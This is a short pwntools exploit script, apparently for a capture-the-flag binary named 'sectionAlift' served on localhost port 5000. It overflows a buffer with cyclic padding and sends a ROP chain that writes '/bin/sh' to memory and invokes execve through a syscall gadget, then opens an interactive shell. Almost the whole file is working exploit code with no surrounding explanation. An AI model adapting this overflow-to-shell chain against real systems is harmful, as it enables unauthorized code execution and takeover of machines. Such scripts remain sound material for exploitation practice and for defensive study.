#!/bin/python3

from pwn import *

def debugger(): 
	pause()
	gdb.attach(proc, gdbscript="", gdb_args=["-ix", "/home/kaligula/.gdbinit_pwndbg"])
	pause()

#proc = process("./sectionAlift")
proc = remote("127.0.0.1", 5000)

padding = cyclic(cyclic_find("eaac"))

## Write /bin/sh to memory
rop = p64(0x000000000041e577) ## pop rax ; ret
rop += b"/bin/sh\x00"
rop += p64(0x0000000000408cc0) ## pop rsi ; ret
rop += p64(0x49f0c0)
rop += p64(0x000000000041feb1) ## mov qword ptr [rsi], rax ; ret

## Get shell
rop += p64(0x000000000041e577) ## pop rax ; ret
rop += p64(59) ## execve syscall number
rop += p64(0x0000000000402128) ## pop rdi ; ret
rop += p64(0x49f0c0) ## pointer to /bin/sh
rop += p64(0x000000000045f997) ## pop rdx ; pop rbx ; ret
rop += p64(0x0)
rop += p64(0x0)
rop += p64(0x0000000000408cc0) ## pop rsi ; ret
rop += p64(0x0)
rop += p64(0x00000000004012e3) ## syscall

payload = padding + rop

#debugger()

proc.sendline(payload)

proc.interactive()
proc.close()
